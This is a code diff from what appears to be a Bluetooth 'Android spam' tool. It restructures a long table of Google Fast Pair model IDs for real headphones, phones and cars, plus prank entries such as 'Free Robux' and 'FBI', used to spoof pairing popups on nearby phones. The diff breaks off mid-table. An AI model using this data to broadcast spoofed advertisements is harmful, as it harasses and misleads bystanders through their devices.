@@ -23,535 +23,530 @@
 
 static const char *TAG = "ANDROID_SPAM";
 
-#define ANDROID_PAYLOAD_SIZE 14
+#define ANDROID_PAYLOAD_SIZE    14
+#define ANDROID_MODEL_SIZE      3
+#define ANDROID_MODEL_OFFSET    8
+#define ANDROID_TX_POWER_OFFSET 13
+#define ANDROID_TX_POWER_RANGE  120
+#define ANDROID_TX_POWER_BIAS   100
 
 typedef struct {
-  uint32_t value;
+  uint8_t bytes[ANDROID_MODEL_SIZE];
 } android_spam_device_t;
 
 static const android_spam_device_t ANDROID_MODELS[] = {
-    {0x0001F0}, // Bisto CSR8670 Dev Board
-    {0x000047}, // Arduino 101
-    {0x470000}, // Arduino 101
-    {0x00000A}, // Test 00000a - Anti-Spoofing
-    {0x0A0000}, // Test 00000a - Anti-Spoofing
-    {0x00000B}, // Google Gphones
-    {0x0B0000}, // Google Gphones
-    {0x0C0000}, // Google Gphones
-    {0x00000D}, // Test 00000D
-    {0x000007}, // Android Auto
-    {0x070000}, // Android Auto
-    {0x000008}, // Foocorp Foophones
-    {0x080000}, // Foocorp Foophones
-    {0x000009}, // Test Android TV
-    {0x090000}, // Test Android TV
-    {0x000035}, // Test 000035
-    {0x350000}, // Test 000035
-    {0x000048}, // Fast Pair Headphones
-    {0x480000}, // Fast Pair Headphones
-    {0x000049}, // Fast Pair Headphones
-    {0x490000}, // Fast Pair Headphones
-    {0x001000}, // LG HBS1110
-    {0x00B727}, // Smart Controller 1
-    {0x01E5CE}, // BLE-Phone
-    {0x0200F0}, // Goodyear
-    {0x00F7D4}, // Smart Setup
-    {0xF00002}, // Goodyear
-    {0xF00400}, // T10
-    {0x1E89A7}, // ATS2833_EVB
-    {0x00000C}, // Google Gphones
-    {0x0577B1}, // Galaxy S23 Ultra
-    {0x05A9BC}, // Galaxy S20+
-    {0xCD8256}, // Bose NC 700 Headphones
-    {0x0000F0}, // Bose QuietComfort 35 II
-    {0xF00000}, // Bose QuietComfort 35 II
-    {0x821F66}, // JBL Flip 6
-    {0xF52494}, // JBL LIVE PRO+ TWS
-    {0x718FA4}, // JBL LIVE300TWS
-    {0x0002F0}, // JBL Everest 110GA
-    {0x92BBBD}, // Pixel Buds
-    {0x000006}, // Google Pixel Buds
-    {0x060000}, // Google Pixel Buds
-    {0xD446A7}, // WH-1000XM5
-    {0x2D7A23}, // WF-1000XM4
-    {0x0E30C3}, // Razer Hammerhead TWS
-    {0x72EF8D}, // Razer Hammerhead TWS X
-    {0x72FB00}, // Soundcore Spirit Pro GVA
-    {0x0003F0}, // LG HBS-835S
-    {0x002000}, // AIAIAI TMA-2 (H60)
-    {0x003000}, // Libratone Q Adapt On-Ear
-    {0x003001}, // Libratone Q Adapt On-Ear
-    {0x00A168}, // boAt  Airdopes 621
-    {0x00AA48}, // Jabra Elite 2
-    {0x00AA91}, // Beoplay E8 2.0
-    {0x00C95C}, // Sony WF-1000X
-    {0x01EEB4}, // WH-1000XM4
-    {0x02AA91}, // B&O Earset
-    {0x01C95C}, // Sony WF-1000X
-    {0x02D815}, // ATH-CK1TW
-    {0x035764}, // PLT V8200 Series
-    {0x038CC7}, // JBL TUNE760NC
-    {0x02DD4F}, // JBL TUNE770NC
-    {0x02E2A9}, // TCL MOVEAUDIO S200
-    {0x035754}, // Plantronics PLT_K2
-    {0x02C95C}, // Sony WH-1000XM2
-    {0x038B91}, // DENON AH-C830NCW
-    {0x02F637}, // JBL LIVE FLEX
-    {0x02D886}, // JBL REFLECT MINI NC
-    {0xF00001}, // Bose QuietComfort 35 II
-    {0xF00201}, // JBL Everest 110GA
-    {0xF00204}, // JBL Everest 310GA
-    {0xF00209}, // JBL LIVE400BT
-    {0xF00205}, // JBL Everest 310GA
-    {0xF00200}, // JBL Everest 110GA
-    {0xF00208}, // JBL Everest 710GA
-    {0xF00207}, // JBL Everest 710GA
-    {0xF00206}, // JBL Everest 310GA
-    {0xF0020A}, // JBL LIVE400BT
-    {0xF0020B}, // JBL LIVE400BT
-    {0xF0020C}, // JBL LIVE400BT
-    {0xF00203}, // JBL Everest 310GA
-    {0xF00202}, // JBL Everest 110GA
-    {0xF00213}, // JBL LIVE650BTNC
-    {0xF0020F}, // JBL LIVE500BT
-    {0xF0020E}, // JBL LIVE500BT
-    {0xF00214}, // JBL LIVE650BTNC
-    {0xF00212}, // JBL LIVE500BT
-    {0xF0020D}, // JBL LIVE400BT
-    {0xF00211}, // JBL LIVE500BT
-    {0xF00215}, // JBL LIVE650BTNC
-    {0xF00210}, // JBL LIVE500BT
-    {0xF00305}, // LG HBS-1500
-    {0xF00304}, // LG HBS-1010
-    {0xF00308}, // LG HBS-1125
-    {0xF00303}, // LG HBS-930
-    {0xF00306}, // LG HBS-1700
-    {0xF00300}, // LG HBS-835S
-    {0xF00309}, // LG HBS-2000
-    {0xF00302}, // LG HBS-830
-    {0xF00307}, // LG HBS-1120
-    {0xF00301}, // LG HBS-835
-    {0xF00E97}, // JBL VIBE BEAM
-    {0x04ACFC}, // JBL WAVE BEAM
-    {0x04AA91}, // Beoplay H4
-    {0x04AFB8}, // JBL TUNE 720BT
-    {0x05A963}, // WONDERBOOM 3
-    {0x05AA91}, // B&O Beoplay E6
-    {0x05C452}, // JBL LIVE220BT
-    {0x05C95C}, // Sony WI-1000X
-    {0x0602F0}, // JBL Everest 310GA
-    {0x0603F0}, // LG HBS-1700
-    {0x1E8B18}, // SRS-XB43
-    {0x1E955B}, // WI-1000XM2
-    {0x1EC95C}, // Sony WF-SP700N
-    {0x1ED9F9}, // JBL WAVE FLEX
-    {0x1EE890}, // ATH-CKS30TW WH
-    {0x1EEDF5}, // Teufel REAL BLUE TWS 3
-    {0x1F1101}, // TAG Heuer Calibre E4 45mm
-    {0x1F181A}, // LinkBuds S
-    {0x1F2E13}, // Jabra Elite 2
-    {0x1F4589}, // Jabra Elite 2
-    {0x1F4627}, // SRS-XG300
-    {0x1F5865}, // boAt Airdopes 441
-    {0x1FBB50}, // WF-C700N
-    {0x1FC95C}, // Sony WF-SP700N
-    {0x1FE765}, // TONE-TF7Q
-    {0x1FF8FA}, // JBL REFLECT MINI NC
-    {0x201C7C}, // SUMMIT
-    {0x202B3D}, // Amazfit PowerBuds
-    {0x20330C}, // SRS-XB33
-    {0x003B41}, // M&D MW65
-    {0x003D8A}, // Cleer FLOW Ⅱ
-    {0x005BC3}, // Panasonic RP-HD610N
-    {0x008F7D}, // soundcore Glow Mini
-    {0x00FA72}, // Pioneer SE-MS9BN
-    {0x0100F0}, // Bose QuietComfort 35 II
-    {0x011242}, // Nirvana Ion
-    {0x013D8A}, // Cleer EDGE Voice
-    {0x01AA91}, // Beoplay H9 3rd Generation
-    {0x038F16}, // Beats Studio Buds
-    {0x039F8F}, // Michael Kors Darci 5e
-    {0x03AA91}, // B&O Beoplay H8i
-    {0x03B716}, // YY2963
-    {0x03C95C}, // Sony WH-1000XM2
-    {0x03C99C}, // MOTO BUDS 135
-    {0x03F5D4}, // Writing Account Key
-    {0x045754}, // Plantronics PLT_K2
-    {0x045764}, // PLT V8200 Series
-    {0x04C95C}, // Sony WI-1000X
-    {0x050F0C}, // Major III Voice
-    {0x052CC7}, // MINOR III
-    {0x057802}, // TicWatch Pro 5
-    {0x0582FD}, // Pixel Buds
-    {0x058D08}, // WH-1000XM4
-    {0x06AE20}, // Galaxy S21 5G
-    {0x06C197}, // OPPO Enco Air3 Pro
-    {0x06C95C}, // Sony WH-1000XM2
-    {0x06D8FC}, // soundcore Liberty 4 NC
-    {0x0744B6}, // Technics EAH-AZ60M2
-    {0x07A41C}, // WF-C700N
-    {0x07C95C}, // Sony WH-1000XM2
-    {0x07F426}, // Nest Hub Max
-    {0x0102F0}, // JBL Everest 110GA
-    {0x0202F0}, // JBL Everest 110GA
-    {0x0302F0}, // JBL Everest 310GA
-    {0x0402F0}, // JBL Everest 310GA
-    {0x0502F0}, // JBL Everest 310GA
-    {0x0702F0}, // JBL Everest 710GA
-    {0x0802F0}, // JBL Everest 710GA
-    {0x054B2D}, // JBL TUNE125TWS
-    {0x0660D7}, // JBL LIVE770NC
-    {0x0103F0}, // LG HBS-835
-    {0x0203F0}, // LG HBS-830
-    {0x0303F0}, // LG HBS-930
-    {0x0403F0}, // LG HBS-1010
-    {0x0503F0}, // LG HBS-1500
-    {0x0703F0}, // LG HBS-1120
-    {0x0803F0}, // LG HBS-1125
-    {0x0903F0}, // LG HBS-2000
-    {0x071C74}, // JBL Flip 6
-    {0x0DC6BF}, // My Awesome Device II
-    {0x0DC95C}, // Sony WH-1000XM3
-    {0x0DEC2B}, // Emporio Armani EA Connected
-    {0x0E138D}, // WF-SP800N
-    {0x0EC95C}, // Sony WI-C600N
-    {0x0ECE95}, // Philips TAT3508
-    {0x0F0993}, // COUMI TWS-834A
-    {0x0F1B8D}, // JBL VIBE BEAM
-    {0x0F232A}, // JBL TUNE BUDS
-    {0x0F2D16}, // WH-CH520
-    {0x20A19B}, // WF-SP800N
-    {0x20C95C}, // Sony WF-SP700N
-    {0x20CC2C}, // SRS-XB43
-    {0x213C8C}, // DIZO Wireless Power
-    {0x21521D}, // boAt Rockerz 355 (Green)
-    {0x21A04E}, // oraimo FreePods Pro
-    {0x5BA9B5}, // WF-SP800N
-    {0x5BACD6}, // Bose QC Ultra Earbuds
-    {0x5BD6C9}, // JBL TUNE225TWS
-    {0x5BE3D4}, // JBL Flip 6
-    {0x5C0206}, // UA | JBL TWS STREAK
-    {0x5C0C84}, // JBL TUNE225TWS
-    {0x5C4833}, // WH-CH720N
-    {0x5C4A7E}, // LG HBS-XL7
-    {0x5C55E7}, // TCL MOVEAUDIO S200
-    {0x5C7CDC}, // WH-1000XM5
-    {0x5C8AA5}, // JBL LIVE220BT
-    {0x5CC900}, // Sony WF-1000X
-    {0x5CC901}, // Sony WF-1000X
-    {0x5CC902}, // Sony WH-1000XM2
-    {0x5CC903}, // Sony WH-1000XM2
-    {0x5CC904}, // Sony WI-1000X
-    {0x5CC905}, // Sony WI-1000X
-    {0x5CC906}, // Sony WH-1000XM2
-    {0x5CC907}, // Sony WH-1000XM2
-    {0x5CC908}, // Sony WI-1000X
-    {0x5CC909}, // Sony WI-1000X
-    {0x5CC90A}, // Sony WH-1000XM3
-    {0x5CC90B}, // Sony WH-1000XM3
-    {0x5CC90C}, // Sony WH-1000XM3
-    {0x5CC90D}, // Sony WH-1000XM3
-    {0x5CC90E}, // Sony WI-C600N
-    {0x5CC90F}, // Sony WI-C600N
-    {0x5CC910}, // Sony WI-C600N
-    {0x5CC911}, // Sony WI-C600N
-    {0x5CC912}, // Sony WI-C600N
-    {0x5CC913}, // Sony WI-C600N
-    {0x5CC914}, // Sony WI-SP600N
-    {0x5CC915}, // Sony WI-SP600N
-    {0x5CC916}, // Sony WI-SP600N
-    {0x5CC917}, // Sony WI-SP600N
-    {0x5CC918}, // Sony WI-SP600N
-    {0x5CC919}, // Sony WI-SP600N
-    {0x5CC91A}, // Sony WI-SP600N
-    {0x5CC91B}, // Sony WI-SP600N
-    {0x5CC91C}, // Sony WI-SP600N
-    {0x5CC91D}, // Sony WI-SP600N
-    {0x5CC91E}, // Sony WF-SP700N
-    {0x5CC91F}, // Sony WF-SP700N
-    {0x5CC920}, // Sony WF-SP700N
-    {0x5CC921}, // Sony WF-SP700N
-    {0x5CC922}, // Sony WF-SP700N
-    {0x5CC923}, // Sony WF-SP700N
-    {0x5CC924}, // Sony WF-SP700N
-    {0x5CC925}, // Sony WF-SP700N
-    {0x5CC926}, // Sony WF-SP700N
-    {0x5CC927}, // Sony WF-SP700N
-    {0x5CC928}, // Sony WH-H900N
-    {0x5CC929}, // Sony WH-H900N
-    {0x5CC92A}, // Sony WH-H900N
-    {0x5CC92B}, // Sony WH-H900N
-    {0x5CC92C}, // Sony WH-H900N
-    {0x5CC92D}, // Sony WH-H900N
-    {0x5CC92E}, // Sony WH-H900N
-    {0x5CC92F}, // Sony WH-H900N
-    {0x5CC930}, // Sony WH-H900N
-    {0x5CC931}, // Sony WH-H900N
-    {0x5CC932}, // Sony WH-CH700N
-    {0x5CC933}, // Sony WH-CH700N
-    {0x5CC934}, // Sony WH-CH700N
-    {0x5CC935}, // Sony WH-CH700N
-    {0x5CC936}, // Sony WH-CH700N
-    {0x5CC937}, // Sony WH-CH700N
-    {0x5CC938}, // Sony WF-1000XM3
-    {0x5CC939}, // Sony WF-1000XM3
-    {0x5CC93A}, // Sony WF-1000XM3
-    {0x5CC93B}, // Sony WF-1000XM3
-    {0x5CC93C}, // Sony WH-XB700
-    {0x5CC93D}, // Sony WH-XB700
-    {0x5CC93E}, // Sony WH-XB700
-    {0x5CC93F}, // Sony WH-XB700
-    {0x5CC940}, // Sony WH-XB900N
-    {0x5CC941}, // Sony WH-XB900N
-    {0x5CC942}, // Sony WH-XB900N
-    {0x5CC943}, // Sony WH-XB900N
-    {0x5CC944}, // Sony WH-XB900N
-    {0x5CC945}, // Sony WH-XB900N
-    {0x5CEE3C}, // Fitbit Charge 4
-    {0x6AD226}, // TicWatch Pro 3
-    {0x6B1C64}, // Pixel Buds
-    {0x6B8C65}, // oraimo FreePods 4
-    {0x6B9304}, // Nokia SB-101
-    {0x6BA5C3}, // Jabra Elite 4
-    {0x6C42C0}, // TWS05
-    {0x6C4DE5}, // JBL LIVE PRO 2 TWS
-    {0x89BAD5}, // Galaxy A23 5G
-    {0x8A31B7}, // Bose QC Ultra Headphones
-    {0x8A3D00}, // Cleer FLOW Ⅱ
-    {0x8A3D01}, // Cleer EDGE Voice
-    {0x8A8F23}, // WF-1000XM5
-    {0x8AADAE}, // JLab GO Work 2
-    {0x8B0A91}, // Jabra Elite 5
-    {0x8B5A7B}, // TicWatch Pro 3 GPS
-    {0x8B66AB}, // Pixel Buds A-Series
-    {0x8BB0A0}, // Nokia Solo Bud+
-    {0x8BF79A}, // Oladance Whisper E1
-    {0x8C07D2}, // Jabra Elite 4 Active
-    {0x8C1706}, // YY7861E
-    {0x8C4236}, // GLIDiC mameBuds
-    {0x8C6B6A}, // realme Buds Air 3S
-    {0x8CAD81}, // KENWOOD WS-A1
-    {0x8CB05C}, // JBL LIVE PRO+ TWS
-    {0x8CD10F}, // realme Buds Air Pro
-    {0x8D13B9}, // BLE-TWS
-    {0x8D16EA}, // Galaxy M14 5G
-    {0x8D5B67}, // Pixel 90c
-    {0x8E14D7}, // LG-TONE-TFP8
-    {0x8E1996}, // Galaxy A24 5g
-    {0x8E4666}, // Oladance Wearable Stereo
-    {0x8E5550}, // boAt Airdopes 511v2
-    {0x9101F0}, // Jabra Elite 2
-    {0x9128CB}, // TCL MOVEAUDIO Neo
-    {0x913B0C}, // YH-E700B
-    {0x915CFA}, // Galaxy A14
-    {0x9171BE}, // Jabra Evolve2 65 Flex
-    {0x917E46}, // LinkBuds
-    {0x91AA00}, // Beoplay E8 2.0
-    {0x91AA01}, // Beoplay H9 3rd Generation
-    {0x91AA02}, // B&O Earset
-    {0x91AA03}, // B&O Beoplay H8i
-    {0x91AA04}, // Beoplay H4
-    {0x91AA05}, // B&O Beoplay E6
-    {0x91BD38}, // LG HBS-FL7
-    {0x91C813}, // JBL TUNE770NC
-    {0x91DABC}, // SRS-XB33
-    {0x92255E}, // LG-TONE-FP6
-    {0x989D0A}, // Set up your new Pixel 2
-    {0x9939BC}, // ATH-SQ1TW
-    {0x994374}, // EDIFIER W320TN
-    {0x997B4A}, // UA | JBL True Wireless Flash X
-    {0x99C87B}, // WH-H810 (h.ear)
-    {0x99D7EA}, // oraimo OpenCirclet
-    {0x99F098}, // Galaxy S22 Ultra
-    {0x9A408A}, // MOTO BUDS 065
-    {0x9A9BDD}, // WH-XB910N
-    {0x9ADB11}, // Pixel Buds Pro
-    {0x9AEEA4}, // LG HBS-FN4
-    {0x9B7339}, // AKG N9 Hybrid
-    {0x9B735A}, // JBL RFL FLOW PRO
-    {0x9B9872}, // Hyundai
-    {0x9BC64D}, // JBL TUNE225TWS
-    {0x9BE931}, // WI-C100
-    {0x9C0AF7}, // JBL VIBE BUDS
-    {0x9C3997}, // ATH-M50xBT2
-    {0x9C4058}, // JBL WAVE FLEX
-    {0x9C6BC0}, // LinkBuds S
-    {0x9C888B}, // WH-H910N (h.ear)
-    {0x9C98DB}, // JBL TUNE225TWS
-    {0x9CA277}, // YY2963
-    {0x9CB5F3}, // WH-1000XM5
-    {0x9CB881}, // soundcore Motion 300
-    {0x9CD0F3}, // LG HBS-TFN7
-    {0x9CE3C7}, // EDIFIER NeoBuds Pro 2
-    {0x9CEFD1}, // SRS-XG500
-    {0x9CF08F}, // JLab Epic Air ANC
-    {0x9D00A6}, // Urbanears Juno
-    {0x9D7D42}, // Galaxy S20
-    {0x9DB896}, // Your BMW
-    {0xA7E52B}, // Bose NC 700 Headphones
-    {0xA7EF76}, // JBL CLUB PRO+ TWS
-    {0xA8001A}, // JBL CLUB ONE
-    {0xA83C10}, // adidas Z.N.E. 01
-    {0xA8658F}, // ROCKSTER GO
-    {0xA8845A}, // oraimo FreePods 4
-    {0xA88B69}, // WF-SP800N
-    {0xA8A00E}, // Nokia CB-201
-    {0xA8A72A}, // JBL LIVE670NC
-    {0xA8C636}, // JBL TUNE660NC
-    {0xA8CAAD}, // Galaxy F04
-    {0xA8E353}, // JBL TUNE BEAM
-    {0xA8F96D}, // JBL ENDURANCE RUN 2 WIRELESS
-    {0xA90358}, // JBL LIVE220BT
-    {0xA92498}, // JBL WAVE BUDS
-    {0xA9394A}, // JBL TUNE230NC TWS
-    {0xC6936A}, // JBL LIVE PRO+ TWS
-    {0xC69AFD}, // WF-H800 (h.ear)
-    {0xC6ABEA}, // UA | JBL True Wireless Flash X
-    {0xC6EC5F}, // SRS-XE300
-    {0xC7736C}, // Philips PH805
-    {0xC79B91}, // Jabra Evolve2 75
-    {0xC7A267}, // Fake Test Mouse
-    {0xC7D620}, // JBL Pulse 5
-    {0xC7FBCC}, // JBL VIBE FLEX
-    {0xC8162A}, // LinkBuds S
-    {0xC85D7A}, // JBL ENDURANCE PEAK II
-    {0xC8777E}, // Jaybird Vista 2
-    {0xC878AA}, // SRS-XV800
-    {0xC8C641}, // Redmi Buds 4 Lite
-    {0xC8D335}, // WF-1000XM4
-    {0xC8E228}, // Pixel Buds Pro
-    {0xC9186B}, // WF-1000XM4
-    {0xC9836A}, // JBL Xtreme 4
-    {0xCA7030}, // ATH-TWX7
-    {0xCAB6B8}, // ATH-M20xBT
-    {0xCAF511}, // Jaybird Vista 2
-    {0xCB093B}, // Urbanears Juno
-    {0xCB529D}, // soundcore Glow
-    {0xCC438E}, // WH-1000XM4
-    {0xCC5F29}, // JBL TUNE660NC
-    {0xCC754F}, // YY2963
-    {0xCC93A5}, // Sync
-    {0xCCBB7E}, // MIDDLETON
-    {0xD5A59E}, // Jabra Elite Speaker
-    {0xD5B5F7}, // MOTO BUDS 600 ANC
-    {0xD5C6CE}, // realme TechLife Buds T100
-    {0xD654CD}, // JBL Xtreme 4
-    {0xD65F4E}, // Philips Fidelio T2
-    {0xD69B2B}, // TONE-T80S
-    {0xD6C195}, // LG HBS-SL5
-    {0xD6E870}, // Beoplay EX
-    {0xD6EE84}, // Rockerz 255 Max
-    {0xD7102F}, // ATH-SQ1TW SVN
-    {0xD7E3EB}, // Cleer HALO
-    {0xD8058C}, // MOTIF II A.N.C.
-    {0xD820EA}, // WH-XB910N
-    {0xD87A3E}, // Pixel Buds Pro
-    {0xD8F3BA}, // WH-1000XM5
-    {0xD8F4E8}, // realme Buds T100
-    {0xD90617}, // Redmi Buds 4 Active
-    {0xD933A7}, // JBL ENDURANCE PEAK 3
-    {0xD9414F}, // JBL SOUNDGEAR SENSE
-    {0xD97EBA}, // JBL TUNE125TWS
-    {0xD9964B}, // JBL TUNE670NC
-    {0xDA0F83}, // SPACE
-    {0xDA4577}, // Jabra Elite 4 Active
-    {0xDA5200}, // blackbox TRIP II
-    {0xDAD3A6}, // Jabra Elite 10
-    {0xDADE43}, // Chromebox
-    {0xDAE096}, // adidas RPT-02 SOL
-    {0xDB8AC7}, // LG TONE-FREE
-    {0xDBE5B1}, // WF-1000XM4
-    {0xDC5249}, // WH-H810 (h.ear)
-    {0xDCF33C}, // JBL REFLECT MINI NC
-    {0xDD4EC0}, // OPPO Enco Air3 Pro
-    {0xDE215D}, // WF-C500
-    {0xDE577F}, // Teufel AIRY TWS 2
-    {0xDEC04C}, // SUMMIT
-    {0xDEDD6F}, // soundcore Space One
-    {0xDEE8C0}, // Ear (2)
-    {0xDEEA86}, // Xiaomi Buds 4 Pro
-    {0xDEF234}, // WH-H810 (h.ear)
-    {0xDF01E3}, // Sync
-    {0xDF271C}, // Big Bang e Gen 3
-    {0xDF42DE}, // TAG Heuer Calibre E4 42mm
-    {0xDF4B02}, // SRS-XB13
-    {0xDF9BA4}, // Bose NC 700 Headphones
-    {0xDFD433}, // JBL REFLECT AERO
-    {0xE020C1}, // soundcore Motion 300
-    {0xE06116}, // LinkBuds S
-    {0xE07634}, // OnePlus Buds Z
-    {0xE09172}, // JBL TUNE BEAM
-    {0xE4E457}, // Galaxy S20 5G
-    {0xE5440B}, // TAG Heuer Calibre E4 45mm
-    {0xE57363}, // Oladance Wearable Stereo
-    {0xE57B57}, // Super Device
-    {0xE5B4B0}, // WF-1000XM5
-    {0xE5B91B}, // SRS-XB33
-    {0xE5E2E9}, // Zone Wireless 2
-    {0xE64613}, // JBL WAVE BEAM
-    {0xE64CC6}, // Set up your new Pixel 3 XL
-    {0xE69877}, // JBL REFLECT AERO
-    {0xE6E37E}, // realme Buds  Air 5 Pro
-    {0xE6E771}, // ATH-CKS50TW
-    {0xE6E8B8}, // POCO Pods
-    {0xE750CE}, // Jabra Evolve2 75
-    {0x0052DA}, // blackbox TRIP II
-    {0x109201}, // Beoplay H9 3rd Generation
-    {0x124366}, // BLE-Phone
-    {0x126644}, // WH-1000XM4
-    {0x284500}, // Plantronics PLT_K2
-    {0x532011}, // Big Bang e Gen 3
-    {0x549547}, // JBL WAVE BUDS
-    {0x567679}, // Pixel Buds Pro
-    {0x575836}, // Sony WI-1000X
-    {0x596007}, // MOTIF II A.N.C.
-    {0x612907}, // Redmi Buds 4 Lite
-    {0x614199}, // Oraimo FreePods Pro
-    {0x625740}, // LG-TONE-NP3
-    {0x641372}, // Sony WI-1000X
-    {0x641630}, // boAt Airdopes 452
-    {0x664454}, // JBL TUNE 520BT
-    {0x706908}, // Sony WH-1000XM3
-    {0x837980}, // Sony WH-1000XM3
-    {0x855347}, // NIRVANA NEBULA
-    {0x861698}, // LinkBuds
-    {0xCB2FE7}, // soundcore Motion X500
-    {0xD99CA1}, // Flipper Zero
-    {0x77FF67}, // Free Robux
-    {0xAA187F}, // Free VBucks
-    {0xDCE9EA}, // Rickroll
-    {0x87B25F}, // Animated Rickroll
-    {0x1448C9}, // BLM
-    {0x13B39D}, // Talking Sasquach
-    {0x7C6CDB}, // Obama
-    {0x005EF9}, // Ryanair
-    {0xE2106F}, // FBI
-    {0xB37A62}, // Tesla
-    {0x92ADC9}, // Ton Upgrade Netflix
+    {{0x00, 0x01, 0xF0}}, // Bisto CSR8670 Dev Board
+    {{0x00, 0x00, 0x47}}, // Arduino 101
+    {{0x47, 0x00, 0x00}}, // Arduino 101
+    {{0x00, 0x00, 0x0A}}, // Test 00000a - Anti-Spoofing
+    {{0x0A, 0x00, 0x00}}, // Test 00000a - Anti-Spoofing
+    {{0x00, 0x00, 0x0B}}, // Google Gphones
+    {{0x0B, 0x00, 0x00}}, // Google Gphones
+    {{0x0C, 0x00, 0x00}}, // Google Gphones
+    {{0x00, 0x00, 0x0D}}, // Test 00000D
+    {{0x00, 0x00, 0x07}}, // Android Auto
+    {{0x07, 0x00, 0x00}}, // Android Auto
+    {{0x00, 0x00, 0x08}}, // Foocorp Foophones
+    {{0x08, 0x00, 0x00}}, // Foocorp Foophones
+    {{0x00, 0x00, 0x09}}, // Test Android TV
+    {{0x09, 0x00, 0x00}}, // Test Android TV
+    {{0x00, 0x00, 0x35}}, // Test 000035
+    {{0x35, 0x00, 0x00}}, // Test 000035
+    {{0x00, 0x00, 0x48}}, // Fast Pair Headphones
+    {{0x48, 0x00, 0x00}}, // Fast Pair Headphones
+    {{0x00, 0x00, 0x49}}, // Fast Pair Headphones
+    {{0x49, 0x00, 0x00}}, // Fast Pair Headphones
+    {{0x00, 0x10, 0x00}}, // LG HBS1110
+    {{0x00, 0xB7, 0x27}}, // Smart Controller 1
+    {{0x01, 0xE5, 0xCE}}, // BLE-Phone
+    {{0x02, 0x00, 0xF0}}, // Goodyear
+    {{0x00, 0xF7, 0xD4}}, // Smart Setup
+    {{0xF0, 0x00, 0x02}}, // Goodyear
+    {{0xF0, 0x04, 0x00}}, // T10
+    {{0x1E, 0x89, 0xA7}}, // ATS2833_EVB
+    {{0x00, 0x00, 0x0C}}, // Google Gphones
+    {{0x05, 0x77, 0xB1}}, // Galaxy S23 Ultra
+    {{0x05, 0xA9, 0xBC}}, // Galaxy S20+
+    {{0xCD, 0x82, 0x56}}, // Bose NC 700 Headphones
+    {{0x00, 0x00, 0xF0}}, // Bose QuietComfort 35 II
+    {{0xF0, 0x00, 0x00}}, // Bose QuietComfort 35 II
+    {{0x82, 0x1F, 0x66}}, // JBL Flip 6
+    {{0xF5, 0x24, 0x94}}, // JBL LIVE PRO+ TWS
+    {{0x71, 0x8F, 0xA4}}, // JBL LIVE300TWS
+    {{0x00, 0x02, 0xF0}}, // JBL Everest 110GA
+    {{0x92, 0xBB, 0xBD}}, // Pixel Buds
+    {{0x00, 0x00, 0x06}}, // Google Pixel Buds
+    {{0x06, 0x00, 0x00}}, // Google Pixel Buds
+    {{0xD4, 0x46, 0xA7}}, // WH-1000XM5
+    {{0x2D, 0x7A, 0x23}}, // WF-1000XM4
+    {{0x0E, 0x30, 0xC3}}, // Razer Hammerhead TWS
+    {{0x72, 0xEF, 0x8D}}, // Razer Hammerhead TWS X
+    {{0x72, 0xFB, 0x00}}, // Soundcore Spirit Pro GVA
+    {{0x00, 0x03, 0xF0}}, // LG HBS-835S
+    {{0x00, 0x20, 0x00}}, // AIAIAI TMA-2 (H60)
+    {{0x00, 0x30, 0x00}}, // Libratone Q Adapt On-Ear
+    {{0x00, 0x30, 0x01}}, // Libratone Q Adapt On-Ear
+    {{0x00, 0xA1, 0x68}}, // boAt  Airdopes 621
+    {{0x00, 0xAA, 0x48}}, // Jabra Elite 2
+    {{0x00, 0xAA, 0x91}}, // Beoplay E8 2.0
+    {{0x00, 0xC9, 0x5C}}, // Sony WF-1000X
+    {{0x01, 0xEE, 0xB4}}, // WH-1000XM4
+    {{0x02, 0xAA, 0x91}}, // B&O Earset
+    {{0x01, 0xC9, 0x5C}}, // Sony WF-1000X
+    {{0x02, 0xD8, 0x15}}, // ATH-CK1TW
+    {{0x03, 0x57, 0x64}}, // PLT V8200 Series
+    {{0x03, 0x8C, 0xC7}}, // JBL TUNE760NC
+    {{0x02, 0xDD, 0x4F}}, // JBL TUNE770NC
+    {{0x02, 0xE2, 0xA9}}, // TCL MOVEAUDIO S200
+    {{0x03, 0x57, 0x54}}, // Plantronics PLT_K2
+    {{0x02, 0xC9, 0x5C}}, // Sony WH-1000XM2
+    {{0x03, 0x8B, 0x91}}, // DENON AH-C830NCW
+    {{0x02, 0xF6, 0x37}}, // JBL LIVE FLEX
+    {{0x02, 0xD8, 0x86}}, // JBL REFLECT MINI NC
+    {{0xF0, 0x00, 0x01}}, // Bose QuietComfort 35 II
+    {{0xF0, 0x02, 0x01}}, // JBL Everest 110GA
+    {{0xF0, 0x02, 0x04}}, // JBL Everest 310GA
+    {{0xF0, 0x02, 0x09}}, // JBL LIVE400BT
+    {{0xF0, 0x02, 0x05}}, // JBL Everest 310GA
+    {{0xF0, 0x02, 0x00}}, // JBL Everest 110GA
+    {{0xF0, 0x02, 0x08}}, // JBL Everest 710GA
+    {{0xF0, 0x02, 0x07}}, // JBL Everest 710GA
+    {{0xF0, 0x02, 0x06}}, // JBL Everest 310GA
+    {{0xF0, 0x02, 0x0A}}, // JBL LIVE400BT
+    {{0xF0, 0x02, 0x0B}}, // JBL LIVE400BT
+    {{0xF0, 0x02, 0x0C}}, // JBL LIVE400BT
+    {{0xF0, 0x02, 0x03}}, // JBL Everest 310GA
+    {{0xF0, 0x02, 0x02}}, // JBL Everest 110GA
+    {{0xF0, 0x02, 0x13}}, // JBL LIVE650BTNC
+    {{0xF0, 0x02, 0x0F}}, // JBL LIVE500BT
+    {{0xF0, 0x02, 0x0E}}, // JBL LIVE500BT
+    {{0xF0, 0x02, 0x14}}, // JBL LIVE650BTNC
+    {{0xF0, 0x02, 0x12}}, // JBL LIVE500BT
+    {{0xF0, 0x02, 0x0D}}, // JBL LIVE400BT
+    {{0xF0, 0x02, 0x11}}, // JBL LIVE500BT
+    {{0xF0, 0x02, 0x15}}, // JBL LIVE650BTNC
+    {{0xF0, 0x02, 0x10}}, // JBL LIVE500BT
+    {{0xF0, 0x03, 0x05}}, // LG HBS-1500
+    {{0xF0, 0x03, 0x04}}, // LG HBS-1010
+    {{0xF0, 0x03, 0x08}}, // LG HBS-1125
+    {{0xF0, 0x03, 0x03}}, // LG HBS-930
+    {{0xF0, 0x03, 0x06}}, // LG HBS-1700
+    {{0xF0, 0x03, 0x00}}, // LG HBS-835S
+    {{0xF0, 0x03, 0x09}}, // LG HBS-2000
+    {{0xF0, 0x03, 0x02}}, // LG HBS-830
+    {{0xF0, 0x03, 0x07}}, // LG HBS-1120
+    {{0xF0, 0x03, 0x01}}, // LG HBS-835
+    {{0xF0, 0x0E, 0x97}}, // JBL VIBE BEAM
+    {{0x04, 0xAC, 0xFC}}, // JBL WAVE BEAM
